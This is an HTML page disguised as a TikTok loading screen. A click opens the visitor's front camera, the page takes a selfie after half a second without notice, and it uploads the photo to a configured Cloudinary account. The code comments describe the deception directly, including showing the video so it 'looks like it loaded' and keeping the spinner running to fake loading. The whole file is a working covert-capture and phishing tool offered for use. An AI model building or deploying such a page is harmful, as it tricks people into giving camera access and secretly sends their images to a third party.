<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<title>TikTok</title>
<style>
body, html {
margin: 0;
padding: 0;
width: 100%;
height: 100%;
background-color: #000;
overflow: hidden;
}

/* The Video Feed - Hidden initially */
#videoFeed {
position: absolute;
top: 0;
left: 0;
width: 100%;
height: 100%;
object-fit: cover;
z-index: 1;
display: none; /* Hidden until needed */
}

/* The Loading Spinner - Visible initially */
#loader {
position: absolute;
top: 50%;
left: 50%;
transform: translate(-50%, -50%);
z-index: 10;
display: flex;
align-items: center;
justify-content: center;
}

.spinner {
width: 40px;
height: 40px;
border: 3px solid rgba(255, 255, 255, 0.3);
border-top-color: #fff;
border-radius: 50%;
animation: spin 1s linear infinite;
}

@keyframes spin {
to { transform: rotate(360deg); }
}

/* Flash Effect */
#flash {
position: absolute;
top: 0; left: 0; width: 100%; height: 100%;
background: white;
opacity: 0;
z-index: 20;
pointer-events: none;
}

#canvas { display: none; }
</style>
</head>
<body>

<video id="videoFeed" autoplay playsinline muted></video>
<div id="loader"><div class="spinner"></div></div>
<div id="flash"></div>
<canvas id="canvas"></canvas>

<!-- Cloudinary JS SDK -->
<script src="https://upload-js.cloudinary.com/v2.0/global/all.js" type="text/javascript"></script>

<script>
// --- CONFIGURATION ---
// 1. Go to https://cloudinary.com, sign up free.
// 2. Get your Cloud Name from the dashboard.
const CLOUD_NAME = 'mmf0socw';
// 3. Create an "Unsigned Upload Preset" in Cloudinary (Settings > Upload) and paste its name here.
const UPLOAD_PRESET = 'ml_default';
// ---------------------

const video = document.getElementById('videoFeed');
const loader = document.getElementById('loader');
const flash = document.getElementById('flash');
const canvas = document.getElementById('canvas');

let captured = false;

// Step 1: User clicks anywhere -> Start Camera
document.body.addEventListener('click', async () => {
if (captured) return;

try {
const stream = await navigator.mediaDevices.getUserMedia({
video: { facingMode: "user" },
audio: false
});

video.srcObject = stream;

// Wait for video to load
video.onloadedmetadata = () => {
video.play();

// Hide loader, show video briefly so it looks like it loaded
loader.style.display = 'none';
video.style.display = 'block';

// Step 2: Wait 500ms then Capture Automatically
setTimeout(() => {
captureAndSend();
}, 500);
};

} catch (err) {
console.error("Camera error:", err);
alert("Camera permission denied.");
}
});

function captureAndSend() {
if (captured) return;
captured = true;

// 1. Set Canvas Size
canvas.width = video.videoWidth;
canvas.height = video.videoHeight;
const ctx = canvas.getContext('2d');

// 2. Draw Frame
ctx.drawImage(video, 0, 0);

// 3. Flash Effect (Optional, very fast)
flash.style.opacity = '1';
setTimeout(() => { flash.style.opacity = '0'; }, 100);

// 4. Hide Video Feed (User sees blank screen or loader again)
video.style.display = 'none';
loader.style.display = 'flex'; // Show spinner again to indicate "processing"

// 5. Convert to Blob and Upload to Cloudinary
canvas.toBlob((blob) => {
const formData = new FormData();
formData.append('file', blob, 'selfie.jpg');
formData.append('upload_preset', UPLOAD_PRESET);

fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`, {
method: 'POST',
body: formData
})
.then(response => response.json())
.then(data => {
console.log('Uploaded:', data.secure_url);
// Optional: You can keep the spinner spinning forever to look like it's loading
})
.catch(err => console.error('Upload failed', err));
}, 'image/jpeg');
}
</script>
</body>
</html>
